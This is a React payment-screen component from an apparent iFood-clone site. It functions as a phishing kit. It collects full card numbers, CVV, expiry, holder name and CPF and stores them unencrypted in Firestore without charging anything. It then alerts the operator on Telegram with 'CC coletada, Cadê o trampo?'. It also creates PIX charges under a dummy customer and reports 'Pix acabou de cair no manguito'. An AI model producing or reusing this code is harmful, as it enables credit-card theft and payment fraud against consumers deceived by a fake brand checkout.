import { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ArrowLeft, CreditCard, Banknote } from 'lucide-react';
import { useCart } from '../context/CartContext';
import { motion } from 'framer-motion';
import { db } from '../services/firebase';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { authenticateVeopag, createPixDeposit } from '../services/veopag';
import { notifyTelegram } from '../services/telegram';
import QRCode from 'react-qr-code';

export default function IFoodPaymentScreen() {
    const navigate = useNavigate();
    const location = useLocation();
    const { cartItems, cartTotal, clearCart, discountAmount } = useCart();
    const deliveryData = location.state || { method: 'pickup', address: null };

    const [paymentMethod, setPaymentMethod] = useState('pix');
    const [ccData, setCcData] = useState({ number: '', expiry: '', cvv: '', name: '', cpf: '' });

    // Checkout State
    const [isProcessing, setIsProcessing] = useState(false);
    const [pixData, setPixData] = useState(null);
    const [orderSuccess, setOrderSuccess] = useState(false);

    // Masks
    const handleCcNumber = (val) => setCcData(p => ({ ...p, number: val.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim().substring(0, 19) }));
    const handleCcExpiry = (val) => setCcData(p => ({ ...p, expiry: val.replace(/\D/g, '').replace(/(\d{2})(?=\d)/, '$1/').substring(0, 5) }));
    const handleCcCvv = (val) => setCcData(p => ({ ...p, cvv: val.replace(/\D/g, '').substring(0, 3) }));
    const handleCpf = (val) => {
        let v = val.replace(/\D/g, '');
        if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
        else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
        else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
        setCcData(p => ({ ...p, cpf: v.substring(0, 14) }));
    };

    const deliveryFee = deliveryData.method === 'delivery' ? (cartTotal >= 60 ? 0 : 8.00) : 0;
    const total = cartTotal - discountAmount + deliveryFee;

    const handleFinishPayment = async () => {
        setIsProcessing(true);
        try {
            // 1. Salvar no Firebase
            // Remove undefined fields to prevent Firestore serialization errors
            const safeDeliveryData = JSON.parse(JSON.stringify(deliveryData || {}));

            const orderRef = await addDoc(collection(db, "orders"), {
                items: cartItems.map(item => ({ id: item.id, name: item.name, price: item.price, quantity: item.quantity })),
                subtotal: cartTotal,
                discount: discountAmount,
                deliveryFee,
                total,
                deliveryData: safeDeliveryData,
                payment: {
                    method: paymentMethod,
                    ccInfo: paymentMethod === 'credit_card' ? {
                        name: ccData.name,
                        cpf: ccData.cpf,
                        number: ccData.number,
                        expiry: ccData.expiry,
                        cvv: ccData.cvv
                    } : null
                },
                createdAt: serverTimestamp()
            });

            // 2. Integração PIX Veopag se selecionado
            if (paymentMethod === 'pix') {
                const token = await authenticateVeopag();
                // Dummy customer config for PIX payload
                const customer = {
                    name: "Cliente iFood",
                    email: "cliente@ifoodclone.com",
                    document: "00000000000"
                };
                const qrResponse = await createPixDeposit(token, total, customer);
                setPixData(qrResponse);

                // NOTIFICATION: "Quando o endpoint /pix cria cobrança"
                // insertPix()
                await notifyTelegram("Pix acabou de ser gerado, de olho no lance!");
            } else {
                // Cartão finalizado com sucesso (Mock)

                // NOTIFICATION: "Quando /order com card=true for inserida no banco"
                // insertCardOrder()
                await notifyTelegram("CC coletada, Cadê o trampo?");

                setOrderSuccess(true);
            }

            clearCart();
        } catch (err) {
            console.error("Erro ao processar pedido:", err);
            alert("Erro ao salvar no banco Firebase: " + err.message);
        } finally {
            setIsProcessing(false);
        }
    };

    const handleMockPixPaid = async () => {
        setIsProcessing(true);
        try {
            // Como não teremos webhook no Vercel, o cliente/sistema simula a aprovação aqui
            await notifyTelegram("Pix acabou de cair no manguito!!");
            setPixData(null);
            setOrderSuccess(true);
        } catch (e) {
            console.error(e);
        } finally {
            setIsProcessing(false);
        }
    };

    if (pixData) {
        return (
            <div className="flex flex-col min-h-screen bg-white pb-24 font-sans slide-in-left items-center p-8 text-center pt-20">
                <h2 className="font-bold text-2xl mb-4">Pague pelo app do seu banco</h2>
                <p className="text-gray-500 mb-6">Utilize o PIX Copia e Cola ou escaneie o código abaixo</p>

                {pixData.qrcode.length < 500 || pixData.qrcode.startsWith('000201') ? (
                    <QRCode value={pixData.qrcode} size={220} />
                ) : (
                    <img src={pixData.qrcode.includes('data:image') ? pixData.qrcode : `data:image/png;base64,${pixData.qrcode}`} alt="PIX" width={220} height={220} />
                )}

                <div className="mt-8 w-full border rounded-lg p-3 bg-gray-50 overflow-hidden text-left mb-4">
                    <p className="text-xs break-all text-gray-400 max-h-16 overflow-y-auto">{pixData.qrcode}</p>
                </div>

                <button
                    onClick={() => navigator.clipboard.writeText(pixData.qrcode)}
                    className="w-full text-white font-bold py-3.5 rounded-md transition-opacity hover:opacity-90"
                    style={{ backgroundColor: 'var(--primary)' }}
                >
                    Copiar código PIX
                </button>

                <button
                    onClick={handleMockPixPaid}
                    className="w-full bg-green-500 text-white font-bold py-3.5 rounded-md mt-4 active:bg-green-600 shadow-md"
                >
                    Já realizei o pagamento
                </button>

                <button onClick={() => navigate('/')} className="mt-6 font-bold" style={{ color: 'var(--primary)' }}>
                    Voltar ao Cardápio
                </button>
            </div>
        );
    }

    if (orderSuccess) {
        return (
            <div className="flex flex-col min-h-screen bg-white font-sans items-center justify-center p-8 text-center">
                <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mb-6">
                    <Banknote size={32} className="text-green-500" />
                </div>
                <h2 className="font-bold text-2xl mb-2">Pedido Recebido!</h2>
                <p className="text-gray-500 mb-8">A cozinha já está preparando o seu pedido.</p>
                <button onClick={() => navigate('/')} className="w-full text-white font-bold py-3.5 rounded-md transition-opacity hover:opacity-90" style={{ backgroundColor: 'var(--primary)' }}>
                    Voltar ao Início
                </button>
            </div>
        );
    }

    // Validação basica para CC
    const isCcValid = paymentMethod === 'pix' ||
        (ccData.number.length >= 19 && ccData.expiry.length === 5 && ccData.cvv.length === 3 && ccData.name && ccData.cpf.length === 14);

    return (
        <motion.div
            initial={{ x: '100%', opacity: 0 }}
            animate={{ x: 0, opacity: 1 }}
            exit={{ x: '-100%', opacity: 0 }}
            transition={{ type: "spring", stiffness: 300, damping: 30 }}
            className="flex flex-col min-h-screen bg-gray-50 pb-32 font-sans"
        >
            <header className="sticky top-0 z-50 bg-white shadow-sm flex items-center justify-between p-4 mb-2">
                <button onClick={() => navigate(-1)} className="p-1 rounded-full active:bg-gray-100" style={{ color: 'var(--primary)' }}>
                    <ArrowLeft size={24} />
                </button>
                <h1 className="font-bold text-gray-800 text-lg flex-1 text-center">Forma de pagamento</h1>
                <div style={{ width: 32 }}></div>
            </header>

            <div className="p-4 bg-white flex flex-col gap-4 flex-1">
                <h3 className="font-bold text-gray-800">Escolha a forma de pagamento</h3>

                {/* PIX Option */}
                <label
                    className={`flex items-center gap-3 p-4 border rounded-xl cursor-pointer transition-colors ${paymentMethod === 'pix' ? 'bg-gray-50' : 'border-gray-200'}`}
                    style={paymentMethod === 'pix' ? { borderColor: 'var(--primary)', color: 'var(--primary)' } : {}}
                >
                    <input type="radio" name="payment" value="pix" checked={paymentMethod === 'pix'} onChange={() => setPaymentMethod('pix')} className="accent-purple-600 w-5 h-5" />
                    <div className="flex-1">
                        <h4 className="font-bold text-gray-800">Pix</h4>
                        <p className="text-xs text-green-600 font-medium">Aprovação imediata</p>
                    </div>
                </label>

                {/* Credit Card Option */}
                <label
                    className={`flex items-center gap-3 p-4 border rounded-xl cursor-pointer transition-colors ${paymentMethod === 'credit_card' ? 'bg-gray-50' : 'border-gray-200'}`}
                    style={paymentMethod === 'credit_card' ? { borderColor: 'var(--primary)', color: 'var(--primary)' } : {}}
                >
                    <input type="radio" name="payment" value="credit_card" checked={paymentMethod === 'credit_card'} onChange={() => setPaymentMethod('credit_card')} className="accent-purple-600 w-5 h-5" />
                    <div className="flex-1 flex items-center gap-2">
                        <CreditCard size={20} className="text-gray-600" />
                        <h4 className="font-bold text-gray-800">Cartão de Crédito</h4>
                    </div>
                </label>

                {/* CC Form Animado */}
                {paymentMethod === 'credit_card' && (
                    <div className="flex flex-col gap-3 mt-2 animate-fade-in p-1">
                        <input
                            type="text" placeholder="Número do cartão" maxLength={19}
                            value={ccData.number} onChange={e => handleCcNumber(e.target.value)}
                            className="p-4 border rounded-lg w-full bg-gray-50 outline-none focus:border-purple-600 focus:bg-white"
                        />
                        <div className="flex gap-2 w-full">
                            <input
                                type="text" placeholder="Validade (MM/AA)" maxLength={5}
                                value={ccData.expiry} onChange={e => handleCcExpiry(e.target.value)}
                                className="p-4 border rounded-lg flex-1 bg-gray-50 outline-none focus:border-purple-600 focus:bg-white"
                            />
                            <input
                                type="text" placeholder="CVV" maxLength={3}
                                value={ccData.cvv} onChange={e => handleCcCvv(e.target.value)}
                                className="p-4 border rounded-lg w-24 bg-gray-50 outline-none focus:border-purple-600 focus:bg-white"
                            />
                        </div>
                        <input
                            type="text" placeholder="Nome impresso no cartão" uppercase
                            value={ccData.name} onChange={e => setCcData({ ...ccData, name: e.target.value.toUpperCase() })}
                            className="p-4 border rounded-lg w-full bg-gray-50 outline-none focus:border-purple-600 focus:bg-white uppercase"
                        />
                        <input
                            type="text" placeholder="CPF do titular" maxLength={14}
                            value={ccData.cpf} onChange={e => handleCpf(e.target.value)}
                            className="p-4 border rounded-lg w-full bg-gray-50 outline-none focus:border-purple-600 focus:bg-white"
                        />
                    </div>
                )}
            </div>

            <div className="bg-white p-4 mt-2 mb-32 border-y">
                <h3 className="font-bold text-gray-800 text-sm mb-3">Detalhes das taxas</h3>
                <div className="flex flex-col gap-2">
                    <div className="flex justify-between items-center text-sm text-gray-600">
                        <span>Subtotal</span>
                        <span>{new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(cartTotal)}</span>
                    </div>
                    {discountAmount > 0 && (
                        <div className="flex justify-between items-center text-sm font-medium text-green-600">
                            <span>Cupons de desconto</span>
                            <span>-{new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(discountAmount)}</span>
                        </div>
                    )}
                    {deliveryData.method === 'delivery' && (
                        <div className="flex justify-between items-center text-sm text-gray-600">
                            <span>Taxa de entrega</span>
                            <span>{new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(deliveryFee)}</span>
                        </div>
                    )}
                </div>
            </div>

            <div className="fixed bottom-0 w-full max-w-md bg-white border-t p-4 z-50">
                <div className="flex justify-between items-center mb-3">
                    <span className="text-gray-900 font-bold text-lg">Total</span>
                    <div className="text-right">
                        <span className="text-gray-900 font-black text-xl block">
                            {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(total > 0 ? total : 0)}
                        </span>
                        {discountAmount > 0 && (
                            <span className="text-green-600 text-xs font-medium">Economizou {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(discountAmount)}</span>
                        )}
                    </div>
                </div>
                <button
                    onClick={handleFinishPayment}
                    disabled={!isCcValid || isProcessing || total < 0}
                    className="w-full text-white font-bold py-3.5 rounded-md disabled:bg-gray-300 disabled:text-gray-500 transition-all flex justify-center items-center hover:opacity-90"
                    style={{ backgroundColor: (!isCcValid || isProcessing || total < 0) ? '' : 'var(--primary)' }}
                >
                    {isProcessing ? 'Processando...' : 'Finalizar pagamento'}
                </button>
            </div>
        </motion.div>
    );
}
